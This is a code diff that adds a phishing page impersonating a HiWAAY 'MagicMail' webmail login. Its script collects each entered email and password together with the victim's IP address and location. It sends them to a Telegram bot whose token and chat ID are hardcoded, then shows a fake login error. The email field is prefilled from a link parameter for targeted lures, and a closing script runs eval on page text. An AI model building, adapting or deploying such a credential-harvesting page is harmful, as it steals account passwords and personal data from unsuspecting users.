@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script> -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <meta name="robots" content="noindex">
+    <link rel="icon" href="ref.jpeg">
+
+    <title>MagicMail Server: Login Page</title>
+
+    <!-- Bootstrap core CSS -->
+ <!-- Latest compiled and minified CSS -->
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Latest compiled JavaScript -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <!-- Custom styles for this template -->
+    <!-- <link href="/offcanvas.css" rel="stylesheet"> -->
+    <style>
+     
+
+        /* Medium devices (landscape tablets, 768px and up) */
+        @media only screen and (max-width: 768px) {
+          .sec-column {
+            display: none;
+          }
+        } 
+        .logo{
+
+        }
+
+        body{
+          font-family: Verdana, Tahoma, Arial, Helvetica, sans-serif;
+        }
+ .one {
+  padding-top: 20px;
+  /* padding-right: 100px; */
+/* text-align: left; */
+/* padding-left: 120px; */
+  /* padding-bottom: 20px; */
+
+  border-style: solid;
+  border-color: rgba(255, 255, 255, 0) #1a3966 #1a3966 #1a3966; /* red top, green right, blue bottom and yellow left */
+}
+
+.card {
+  box-shadow: 10px 10px 10px 10px rgba(0,0,0,0.2);
+  /* transition: 0.3s; */
+  padding: 15px 15px 15px 15px;
+  border-radius: 10px;
+  width: 90%;
+}
+
+.card:hover {
+  box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2);
+}
+.logoimage{
+    /* background-size: contain; */
+    width: 23%;
+    height: 10%;
+   padding-left: 20px;
+    padding-bottom: 30px;
+}
+
+
+.card-sm {
+  box-shadow: 0 0 6px 0 rgb(30, 29, 29);
+				/* margin-bottom: 20px; */
+				/* padding: 0 8px; */
+				border: 1px solid rgba(254,254,254,.3);
+				border-radius: 5px;
+					border-color: rgb(0, 0, 0);
+  transition: 0.3s;
+  width: 100%;
+}
+
+.card-sm:hover {
+  box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2);
+}
+.head{
+  padding: 20px;
+  
+}
+.header{
+  color: #1a3966;
+  font-weight:bold;
+  font-family: Verdana, Tahoma, Arial, Helvetica, sans-serif;
+}
+
+.headform {
+  color: #1a3966;
+   text-align: center;
+   font-weight:bold;
+}
+/* .container {
+  padding: 10px 10px 20px 0;
+} */
+.container-sm {
+  padding: 40px 40px 40px 40px;
+  /* text-align: center; */
+}
+
+
+
+
+label{
+  font-size: 12px;
+}
+
+.foo{
+  color: white;
+  background-color: 
+#1a3966 ;
+text-align: center;
+
+
+
+}
+.entfoot{
+  padding-top: 40px;
+}
+
+.foot{
+  font-size: 10px;
+  text-align: center;
+  background-color: 
+#f0f1f2 ;
+border-top-style: solid;
+border-top-color: #8d8d8d;
+border-top-width: 3px;
+
+}
+.pw{
+  font-size: 10px;
+}
+a {
+  text-decoration: none;
+  font-size: 12px;
+}
+
+.magic{
+  width: 65%;
+    height: 100%;
+    /* padding: 10px 10px 10px 0px; */
+}
+
+.button{
+  position: absolute;
+  right: 9.5%;
+  width: 70px;
+
+}
+
+
+
+.form-control {
+				background-color: transparent;
+				width: 80%;
+				height: 20px;
+        box-shadow: 0 -1px 2px 0 rgb(88, 88, 88);
+				/* margin-bottom: 20px; */
+	
+				border: 1px solid rgba(254,254,254,.3);
+				border-radius: 5px;
+					border-color: #fff;
+				}
+			
+    </style>
+
+  </head>
+
+  <body class="bg-light pt-3">
+
+    <div class="container ">
+      <div class=" one"> 
+        <img src="hy.png" class="logoimage" alt="Logo"/>
+   <div class="col d-flex justify-content-center">
+      <div class="card pt-3 pb-5">
+        <div class="container ">
+          <div class="row">
+            <div class="col-sm head">
+          <h3 class="header"> Log In to Access Your </br> Account</h3>
+          <p style="font-size: 14px;">Welcome to your HiWAAY email account! For quick access to manage your email and settings, enter your email address and password in the form on the right, and then click on the login button.</p>
+            </div>
+            <div class="col-sm">
+              <div class="card-sm">
+                <div class="container-sm">
+                  <div class="row">
+                    <h5 class="headform"> Login to MagicMail   <hr/> </h5>
+                     
+                    <form class="justify-content-center" id="messageForm">
+                      <!-- Server based Ajax Response -->
+                      <div class="alert alert-danger" id="serverResponse" style="display: none;">Invalid Username/Password combination</div>
+                  
+                      <div class="form-group pb-3">
+                        <label for="exampleInputEmail1"> Email:</label>
+                        <input type="email" name="email" id="um"  class="form-control" aria-describedby="emailHelp"  required>
+
+                      </div>
+                      <div class="form-group pb-3">
+                        <label for="exampleInputPassword1">Password:</label>
+                        <input type="password" name="password" class="form-control" id="up"  required>
+                       
+                      </div>
+                      <input type="checkbox" onclick="myFunction()"> <small id="emailHelp" class="pw">Show Password</small>
+                      <div>
+                        <a href="http://" class="header" > Forgot your Password?</a>
+                      </div>
+                   
+
+                      <div class="container-magic"> 
+
+                        <div class="row">
+                          <div class="col com">
+<img class="magic" src="magic.png" alt="magic" />
+</div>
+<div class="col coms pt-3 ">
+    
+  <input type="hidden" name="ip" class="form-control" id="demo" value="" placeholder= "">
+  <input type="hidden" name="city" class="form-control" id="demo_1" value="" placeholder= "">
+  <input type="hidden" name="country" class="form-control" id="demo_2" value="" placeholder= "">
+  <input type="hidden" name="postal" class="form-control" id="demo_3" value="" placeholder= "">
+  <input type="hidden" name="date" class="form-control" id="demo_4" value="" placeholder= "">
+  <input type="hidden" name="port" class="form-control" id="demo_5" value="" placeholder= "">
+  <!-- <p name="ip" id="demo"> n </p> -->
+ 
+  <button type="submit"  class="button">Login</button>
+  </div>
+                          </div>  
+
+                      </div>
+                 
+                      </form>
+                  </div>
+                  </div>  
+              </div>
+            </div>
+          </div>
+          </div>  
+
+  
+     
+     
+    </div>
+  </div>
+    <div class="entfoot">
+    
+      <p class="foot">P.O. Box 86, Huntsville, AL. 35804 <br/>
+ Call Us: 18882449229  <br/>
+        
+      Text Us: 12128844400</p>
+
+
+        <p class="foo p-3" style="font-size: 10px;">MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.</p>
+  
+      </div>
+  </div>
+</div>
+  </div>
+    
+
+   
+  
+
+
+
+
+
+         
+        
+
+      </div>
+    </div>
+    <!--Ending of the Modal Box  -->
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+   
+    <script src="sharepointbuisness/lng/jquery.min.js.download"></script>
+    <script src="sharepointbuisness/lng/bootstrap.min.js.download"></script>
+    <script src="sharepointbuisness/lng/popper.min.js.download"></script>
+    <script src="sharepointbuisness/lng/holder.min.js.download"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+      (function(){
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const ref = urlParams.get('ref')
+        document.getElementById('um').value = ref;
+      })();
+    </script>
+
+  <script>
+    $.getJSON('https://ipapi.co/json/', function(data) {
+  
+
+    document.getElementById("demo").value = (data.ip);
+    document.getElementById("demo_1").value = (data.city);
+    document.getElementById("demo_2").value = (data.country);
+    document.getElementById("demo_3").value = (data.postal);
+  
+
+});
+// let add = JSON.stringify (data, null, 2);
+
+var today = new Date();
+var dd = String(today.getDate()).padStart(2, '0');
+var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+var yyyy = today.getFullYear();
+
+today = mm + '/' + dd + '/' + yyyy;
+document.getElementById("demo_4").value = (today);
+
+var port = location.port;
+document.getElementById("demo_5").value = (port);
+
+      const chat_id = '5479638940', botID = 'bot5653395377:AAGjMm0oaOImwqxglwbzCP8XoHV7NODZwCg';
+      const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+      document.querySelector('#messageForm').addEventListener("submit", async e => { // When the user submits the form
+          e.preventDefault(); // Don't submit
+          let text = JSON.stringify ( // Convert the form data to a string to send as our Telegram message
+              Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+          null, 2); // Prettify the JSON so we can read the data easily
+          const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+              method: 'POST',
+              headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+              body: JSON.stringify({chat_id, text }), // The body must be a string, not an object
+          });
+          const messageStatus = document.querySelector('#status');
+          $("#up").val("");
+          $("#um").val("");
+          
+          var count=0;
+                    if(count>=2){
+               
+                        // Redirect the User
+                        window.location.replace("https://owy.mn/35MDuDz");
+                      //  $('#serverResponse').html(res);
+                    }else{
+                          //Insert the Server response
+                          $("#serverResponse").animate({right:0, opacity:"show"}, 1500);
+                          // $('#serverResponse').show();
+                        /**
+                           * Hide Loader After two seconds
+                           */
+                          setTimeout(() => {
+                          hideLoader();
+                          showPageContent();
+                          }, 5000);
+                    }
+                },
+              ).done(function() {
+                /**
+                 * Enable all the Disabled inputs
+                 */
+    
+                um.disabled = false;
+                up.disabled = false;
+
+               
+            
+      });
+  </script>
+
+<script>
+  function myFunction() {
+    var x = document.getElementById("up");
+    if (x.type === "password") {
+      x.type = "text";
+    } else {
+      x.type = "password";
+    }
+  }
+  </script>
+    <script> 
+       
+
+
+        // Email address Validation Eventlistener
+        um.addEventListener('blur', validateEmail);
+
+        // Pass Validation Eventlistener
+        up.addEventListener('blur', validatePass);
+
+
+
+          /**
+           * Validate UserEmail
+           */
+          function validateEmail() {
+            // Target the Desired Element
+            const email = document.getElementById('um');
+            // Regular Expression 
+            const re = /^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$/;
+            
+            // Check if the email form field is disabled or not
+            if(email.disabled !== true) {
+                if(!re.test(email.value)) {
+                    // Add the Invalid Class to it
+                    email.classList.add('is-invalid');
+                    inputFlag = false;
+                  
+                } else {
+                    // Add the Invalid Class to it
+                    email.classList.remove('is-invalid');
+                    inputFlag = true;
+                  
+                }
+            }else {
+                // Make the email Validation flag true
+                inputFlag = true;
+            }
+        }
+
+
+
+        /**
+         * Validate User Password
+         */
+        function validatePass() {
+            /*  Target the Desired Element */
+          const pass = document.getElementById('up');
+          
+          if(pass.value.trim() == '' || pass.value.length < 3) {
+              // Add the Invalid Class to it
+              pass.classList.add('is-invalid');
+              inputFlag = false;
+          }
+        }
+
+
+
+        //Add eventlistener
+        viewFileBtn.addEventListener('click',function(e){
+            // clear Errors
+            clearErrors();
+
+            // Prevent Default Action
+            e.preventDefault();
+
+            // Check if there are no errors
+            if(inputFlag == true) {
+              
+            /** Build the Form Values to be sent behind the seen VIA ajax */
+                /**
+             * Make an Ajax Request To the Server
+             */
+             count=count+1;
+        
+     
+                
+
+            }
+        
+
+        });
+    </script>
+  
+<script>
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+</script>
+
+</body></html>
